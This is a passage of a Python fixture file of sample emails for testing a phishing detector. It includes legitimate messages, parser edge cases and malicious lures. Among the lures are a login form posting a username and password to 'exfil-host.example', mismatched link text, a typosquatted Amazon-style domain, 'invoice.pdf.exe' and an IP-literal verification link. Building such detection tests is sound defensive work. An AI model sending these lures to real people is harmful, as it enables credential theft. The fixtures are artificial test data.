    "label": "Multi-cat — DMARC fail + href/text mismatch (2 cat ×1.08 → ~76)",
    "tags": ["auth_fail", "url_mismatch", "convergence"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="multi-001",
        sender_address="alerts@bank-host.example",
        recipient="customer@example.com",
        subject="Action: review login activity",
        body_html=(
            "<html><body>"
            "<p>We noticed a sign-in. Confirm:</p>"
            '<p><a href="http://malicious-host.example/login">'
            "https://www.bank-host.example/secure/login</a></p>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "alerts@bank-host.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=fail smtp.mailfrom=bank-host.example; "
                "dkim=fail header.d=bank-host.example; dmarc=fail header.from=bank-host.example"
            )},
        ],
    ),
}

MULTI_AUTH_PLUS_HTML_FORM = {
    "label": "Multi-cat — DMARC fail + HTML form (2 cat ×1.08 → ~76)",
    "tags": ["auth_fail", "html_form", "credential_ask", "convergence"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="multi-002",
        sender_address="auth@auth-host.example",
        recipient="user@example.com",
        subject="Verify access",
        body_html=(
            "<html><body>"
            "<p>Confirm credentials:</p>"
            '<form action="http://exfil-host.example/c" method="POST">'
            '<input name="u"><input name="p" type="password">'
            '<input type="submit"></form>'
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "auth@auth-host.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=fail smtp.mailfrom=auth-host.example; "
                "dkim=fail header.d=auth-host.example; dmarc=fail header.from=auth-host.example"
            )},
        ],
    ),
}

MULTI_COUSIN_PLUS_DOUBLE_EXT = {
    "label": "Multi-cat — cousin domain + double-extension attachment",
    "tags": ["cousin_domain", "attachment_exe", "convergence"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 65,
    },
    "email": _email(
        message_id="multi-003",
        sender_address="orders@arnazon-care.com",
        recipient="buyer@example.com",
        subject="Order details",
        body_text="Open the attached invoice for details.",
        headers=[
            {"name": "From", "value": "orders@arnazon-care.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=arnazon-care.com; "
                "dkim=pass header.d=arnazon-care.com; "
                "dmarc=pass header.from=arnazon-care.com"
            )},
        ],
        attachments=[
            {"filename": "invoice.pdf.exe", "mime_type": "application/x-msdownload", "size_bytes": 102400},
        ],
    ),
}

MULTI_FULL_HOUSE = {
    "label": "Multi-cat — every category fires (auth + sender + url + body + attach)",
    "tags": ["auth_fail", "cousin_domain", "ip_url", "credential_ask", "urgency", "attachment_macro", "convergence"],
    "expected": {
        "verdict": Verdict.MALICIOUS,
        "min_score": 80,
    },
    "email": _email(
        message_id="multi-004",
        sender_address="security@app1e-id-support.example",
        recipient="user@example.com",
        subject="Immediate action required: verify your identity",
        body_text=(
            "Your account will be suspended within 24 hours. "
            "Please verify your password by visiting: http://198.51.100.50/verify"
        ),
        body_html=(
            "<html><body>"
            "<p>Your account will be suspended within 24 hours.</p>"
            "<p>Please verify your password by visiting: "
            '<a href="http://198.51.100.50/verify">verify now</a></p>'
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "security@app1e-id-support.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=fail smtp.mailfrom=app1e-id-support.example; "
                "dkim=fail header.d=app1e-id-support.example; "
                "dmarc=fail header.from=app1e-id-support.example"
            )},
        ],
        attachments=[
            {"filename": "verification_form.docm", "mime_type": "application/vnd.ms-word.document.macroEnabled.12", "size_bytes": 73728},
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  14. ADDITIONAL EDGE / PARSER TORTURE CASES
# ═══════════════════════════════════════════════════════════════════════════

EDGE_HTML_ONLY_NO_TEXT = {
    "label": "Edge — body_html populated but body_text empty",
    "tags": ["legitimate", "edge"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="edge-html-001",
        sender_address="news@trusted-news.example",
        recipient="reader@example.com",
        subject="Today's edition",
        body_html="<html><body><p>Today's edition is ready.</p></body></html>",
        headers=[
            {"name": "From", "value": "news@trusted-news.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=trusted-news.example; "
                "dkim=pass header.d=trusted-news.example; "
                "dmarc=pass header.from=trusted-news.example"
            )},
        ],
    ),
}

EDGE_MALFORMED_HTML = {
    "label": "Edge — malformed HTML (unclosed tags) should not crash",
    "tags": ["legitimate", "edge"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="edge-html-002",
        sender_address="news@trusted-news.example",
        recipient="reader@example.com",
        subject="Edition",
        body_html=(
            "<html><body><p>Lead<a href='https://trusted-news.example/x'>"
            "<strong>story<em>broken</strong>"
        ),
        headers=[
            {"name": "From", "value": "news@trusted-news.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=trusted-news.example; "
                "dkim=pass header.d=trusted-news.example; "
                "dmarc=pass header.from=trusted-news.example"
            )},
        ],
    ),
}

EDGE_UNICODE_SUBJECT_BODY = {
    "label": "Edge — non-ASCII subject and body (Hebrew/emoji), legit sender",
    "tags": ["legitimate", "edge", "unicode"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="edge-uni-001",
        sender_address="hello@friendly-co.example",
        recipient="recipient@example.com",
        subject="שלום! 🎉 Welcome",
        body_text="ברוכים הבאים! Glad to have you on board. 🚀",
        headers=[
            {"name": "From", "value": "hello@friendly-co.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=friendly-co.example; "
                "dkim=pass header.d=friendly-co.example; "
                "dmarc=pass header.from=friendly-co.example"
            )},
        ],
    ),
}

EDGE_VERY_LONG_SUBJECT = {
    "label": "Edge — extremely long subject line, legit sender",
    "tags": ["legitimate", "edge"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="edge-long-001",
        sender_address="news@trusted-news.example",
        recipient="reader@example.com",
        subject=("Daily news " + "extra " * 80).strip(),
        body_text="Today's edition is ready.",
        headers=[
            {"name": "From", "value": "news@trusted-news.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=trusted-news.example; "
                "dkim=pass header.d=trusted-news.example; "
                "dmarc=pass header.from=trusted-news.example"
            )},
        ],
    ),
}

EDGE_SCRIPT_STYLE_TAGS_IGNORED = {
    "label": "Edge — sensitive phrase only inside <script>/<style> (must be ignored)",
    "tags": ["legitimate", "edge"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="edge-script-001",
        sender_address="news@trusted-news.example",
        recipient="reader@example.com",
        subject="Newsletter",
        body_html=(
            "<html><head>"
            "<style>/* update your password is just CSS comment text */</style>"
            "<script>// 'verify your account' inside JS comment</script>"
            "</head><body><p>Today's edition.</p></body></html>"
        ),
        headers=[
            {"name": "From", "value": "news@trusted-news.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=trusted-news.example; "
                "dkim=pass header.d=trusted-news.example; "
                "dmarc=pass header.from=trusted-news.example"
            )},
        ],
    ),
}

EDGE_MULTIPLE_AUTH_HEADERS = {
    "label": "Edge — multiple Authentication-Results headers (first wins, expect SAFE)",
    "tags": ["legitimate", "edge", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="edge-auth-001",
        sender_address="ops@regularco.example",
        recipient="customer@example.com",
        subject="Hello",
        body_text="Just a friendly hello.",
        headers=[
            {"name": "From", "value": "ops@regularco.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=regularco.example; "
                "dkim=pass header.d=regularco.example; dmarc=pass header.from=regularco.example"
            )},
            {"name": "Authentication-Results", "value": (
                "upstream-relay.example; spf=fail smtp.mailfrom=regularco.example; "
                "dkim=fail header.d=regularco.example; dmarc=fail header.from=regularco.example"
            )},
        ],
    ),
}

EDGE_AUTH_RESULTS_WITH_COMMENTS = {
    "label": "Edge — Authentication-Results with parenthesized comments around tokens",
    "tags": ["legitimate", "edge", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="edge-auth-002",
        sender_address="ops@regularco.example",
        recipient="customer@example.com",
        subject="Hi",
        body_text="Routine update.",
        headers=[
            {"name": "From", "value": "ops@regularco.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass (sender IP is 198.51.100.5) "
                "smtp.mailfrom=regularco.example; "
                "dkim=pass (signature was verified) header.d=regularco.example; "
                "dmarc=pass (policy matched) header.from=regularco.example"
            )},
        ],
    ),
}

EDGE_REPLY_TO_SAME_DOMAIN = {
    "label": "Edge — Reply-To on same domain as sender (no signal)",
    "tags": ["legitimate", "edge", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="edge-replyto-001",
        sender_address="alice@vendor-corp.example",
        recipient="customer@example.com",
        subject="Quick reply",
        body_text="Thanks. Replying from a different alias.",
        headers=[
            {"name": "From", "value": "alice@vendor-corp.example"},
            {"name": "Reply-To", "value": "alice.replies@vendor-corp.example"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=vendor-corp.example; "
                "dkim=pass header.d=vendor-corp.example; "
                "dmarc=pass header.from=vendor-corp.example"
            )},
        ],
        reply_to_address="alice.replies@vendor-corp.example",
    ),
}

EDGE_RETURN_PATH_TO_ESP = {
    "label": "Edge — Return-Path to ESP (sendgrid) → no mismatch signal",
    "tags": ["legitimate", "edge", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="edge-rp-001",
        sender_address="news@bigshop.example.com",
        recipient="reader@example.com",
        subject="This week",
        body_text="This week's picks are inside.",
        headers=[
            {"name": "From", "value": "news@bigshop.example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=sendgrid.net; "
                "dkim=pass header.d=bigshop.example.com; "
                "dmarc=pass header.from=bigshop.example.com"
            )},
        ],
        return_path_address="bounces+xyz@em.sendgrid.net",
    ),
}

EDGE_SENDER_NO_AT_SIGN = {
    "label": "Edge — sender_address malformed (no '@'), should yield blind spot",
    "tags": ["edge"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="edge-sender-001",
        sender_address="not-an-email-address",
        recipient="user@example.com",
        subject="Internal note",
        body_text="Just a note.",
        headers=[
            {"name": "From", "value": "not-an-email-address"},
        ],
    ),
}

EDGE_FREEMAIL_WITH_PERSONAL_NAME = {
    "label": "Edge — freemail sender, personal display name (no org keyword) → no signal",
    "tags": ["legitimate", "freemail", "edge", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 14,
    },
    "email": _email(
        message_id="edge-freemail-001",
        sender_address="jenny.h.42@gmail.com",
        sender_display_name="Jenny H",
        recipient="friend@example.com",
        subject="Coffee soon?",
        body_text="Want to grab coffee Friday afternoon?",
        headers=[
            {"name": "From", "value": "Jenny H <jenny.h.42@gmail.com>"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=gmail.com; "
                "dkim=pass header.d=gmail.com; dmarc=pass header.from=gmail.com"
            )},
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  BACKWARD-COMPATIBLE ALIASES
# ═══════════════════════════════════════════════════════════════════════════

MASS_PHISHING = MASS_PHISHING_PAYPAL
LEGIT_MARKETING = LEGIT_MARKETING_NEWSLETTER
MALWARE_ATTACHMENT = MALWARE_DOUBLE_EXTENSION


# ═══════════════════════════════════════════════════════════════════════════
#  COLLECTIONS
# ═══════════════════════════════════════════════════════════════════════════

ALL_FIXTURES: list[dict] = [
    # Phishing
    MASS_PHISHING_PAYPAL,
    MASS_PHISHING_MICROSOFT,
    PHISHING_BANK_HTML_FORM,
    PHISHING_HIDDEN_URL,
    PHISHING_NETFLIX_PAYMENT_HOLD,
    PHISHING_FEDEX_DELIVERY_FEE,
    PHISHING_INSTAGRAM_LOGIN_ALERT,
    PHISHING_DROPBOX_SHARED_FILE,
    PHISHING_IRS_TAX_REFUND,
    PHISHING_LINKEDIN_INMAIL,
    PHISHING_CHASE_BANK_LOCKOUT,
    PHISHING_SPOTIFY_PAYMENT_FAILED,
    PHISHING_DOCUSIGN_LOOKALIKE,
    # Spear phishing
    SPEAR_PHISH_COUSIN_DOMAIN,
    SPEAR_PHISH_THREAD_HIJACK,
    SPEAR_PHISH_HOMOGLYPH,
    # BEC
    BEC_WIRE_TRANSFER,
    BEC_GIFT_CARDS,
    BEC_PAYROLL_DIVERSION,
    # Malware
    MALWARE_DOUBLE_EXTENSION,
    MALWARE_MACRO_DOC,
    MALWARE_PASSWORD_PROTECTED_ZIP,
    MALWARE_HTML_ATTACHMENT,
    # Scams
    NIGERIAN_419_SCAM,
    SEXTORTION_SCAM,
    LOTTERY_SCAM,
    # Quishing
    QUISHING_MFA_RESET,
    # Evasion
    EVASION_HIDDEN_TEXT,
    EVASION_DATA_URI,
    EVASION_MULTI_LANGUAGE,
    # Legitimate
    LEGIT_AMAZON_ORDER,
    LEGIT_MARKETING_NEWSLETTER,
    LEGIT_GITHUB_NOTIFICATION,
    LEGIT_PASSWORD_RESET,
    LEGIT_INTERNAL_MEETING,
    LEGIT_COLLEAGUE_WITH_ATTACHMENT,
    LEGIT_SLACK_NOTIFICATION,
    LEGIT_FREEMAIL_PERSONAL,
    LEGITIMATE_INVOICE_WITH_ATTACHMENT,
    # Edge cases
    EMPTY_MINIMAL,
    SUBJECT_ONLY_NO_BODY,
    BENIGN_URGENCY_LEGIT_SENDER,
    SPF_SOFTFAIL_LEGIT_CONTENT,
    VERY_LONG_BODY,
    MIXED_SIGNALS,
    MULTIPLE_RECIPIENTS_BCC,
    # Special
    CREDENTIAL_PHISH_OAUTH,
    # Simple smoke checks
    SIMPLE_PLAIN_TEXT_HELLO,
    SIMPLE_AUTH_PASS_TRANSACTIONAL,
    SIMPLE_INTERNAL_REPLY,
    SIMPLE_LINKEDIN_NOTIFICATION,
    SIMPLE_DOCUSIGN_REQUEST,
    SIMPLE_CALENDAR_REMINDER,
    SIMPLE_PR_MERGE_NOTIFICATION,
    SIMPLE_AWS_BILLING_RECEIPT,
    SIMPLE_SHORT_HTML_NEWSLETTER,
    SIMPLE_TWO_LINE_AUTOREPLY,
    # Auth isolation
    AUTH_DMARC_FAIL_ONLY,
    AUTH_SPF_SOFTFAIL_ONLY,
    AUTH_SPF_NONE_BLINDSPOT,
    AUTH_TEMPERROR_BLINDSPOT_ONLY,
    AUTH_NO_HEADERS_BLINDSPOT,
    AUTH_DKIM_FAIL_ONLY,
    # URL isolation
    URL_IP_LITERAL_ONLY,
    URL_HREF_TEXT_MISMATCH_ONLY,
    URL_BARE_PLAIN_LINK_CLEAN,
    URL_HREF_MATCHING_DISPLAY_CLEAN,
    # Sender isolation
    SENDER_REPLY_TO_MISMATCH_ONLY,
    SENDER_RETURN_PATH_MISMATCH_ONLY,
    SENDER_TYPOSQUAT_PAYPAL_ONLY,
    SENDER_TYPOSQUAT_GOOGLE_ZERO,
    # Body isolation
    BODY_URGENCY_ONLY_LIGHT,
    BODY_URGENCY_ONLY_HEAVY,
    BODY_SENSITIVE_REQUEST_ONLY,
    BODY_HTML_FORM_ONLY,
    # Attachment isolation
    ATTACH_EXE_ONLY,
    ATTACH_DOUBLE_EXTENSION_ONLY,
    ATTACH_MACRO_ONLY,
    ATTACH_PASSWORD_ZIP_ONLY,
    ATTACH_BENIGN_PDF_CLEAN,
    ATTACH_MULTIPLE_BENIGN_CLEAN,
    # Multi-category convergence
    MULTI_AUTH_PLUS_URL_MISMATCH,
    MULTI_AUTH_PLUS_HTML_FORM,
    MULTI_COUSIN_PLUS_DOUBLE_EXT,
    MULTI_FULL_HOUSE,
    # Additional edge / parser torture
    EDGE_HTML_ONLY_NO_TEXT,
    EDGE_MALFORMED_HTML,
    EDGE_UNICODE_SUBJECT_BODY,
    EDGE_VERY_LONG_SUBJECT,
    EDGE_SCRIPT_STYLE_TAGS_IGNORED,
    EDGE_MULTIPLE_AUTH_HEADERS,
    EDGE_AUTH_RESULTS_WITH_COMMENTS,
    EDGE_REPLY_TO_SAME_DOMAIN,
    EDGE_RETURN_PATH_TO_ESP,
    EDGE_SENDER_NO_AT_SIGN,
    EDGE_FREEMAIL_WITH_PERSONAL_NAME,
]


def _verdict_in_expected(fixture: dict, verdict: Verdict) -> bool:
    """True if *verdict* is a possible expected outcome for *fixture*."""
    expected = fixture["expected"]
    if expected.get("verdict") == verdict:
        return True
    return verdict in (expected.get("verdict_in") or ())


def _verdict_required(fixture: dict, verdict: Verdict) -> bool:
    """True only if *verdict* is the fixture's sole expected outcome.

    Stricter than ``_verdict_in_expected``: a fixture whose ``verdict_in``
    permits SAFE *or* SUSPICIOUS does not "require" SAFE. Used to gate the
    no-false-positives contract, which must not flag a fixture that already
    documents SUSPICIOUS as an acceptable outcome."""
    expected = fixture["expected"]
    if expected.get("verdict") == verdict:
        return True
    permitted = expected.get("verdict_in") or ()
    return tuple(permitted) == (verdict,)


SAFE_FIXTURES = [f for f in ALL_FIXTURES if _verdict_required(f, Verdict.SAFE)]
SUSPICIOUS_FIXTURES = [f for f in ALL_FIXTURES if _verdict_in_expected(f, Verdict.SUSPICIOUS)]
LIKELY_MALICIOUS_FIXTURES = [f for f in ALL_FIXTURES if _verdict_in_expected(f, Verdict.LIKELY_MALICIOUS)]
MALICIOUS_FIXTURES = [f for f in ALL_FIXTURES if _verdict_in_expected(f, Verdict.MALICIOUS)]

# Smoke / isolation subsets — handy when you want a fast subset that
# exercises engine plumbing rather than the full corpus.
SIMPLE_FIXTURES = [f for f in ALL_FIXTURES if "smoke" in f.get("tags", [])]
ISOLATION_FIXTURES = [f for f in ALL_FIXTURES if "isolation" in f.get("tags", [])]
CONVERGENCE_FIXTURES = [f for f in ALL_FIXTURES if "convergence" in f.get("tags", [])]
EDGE_FIXTURES = [f for f in ALL_FIXTURES if "edge" in f.get("tags", [])]

BY_TAG: dict[str, list[dict]] = {}
for _fixture in ALL_FIXTURES:
    for _tag in _fixture.get("tags", []):
        BY_TAG.setdefault(_tag, []).append(_fixture)
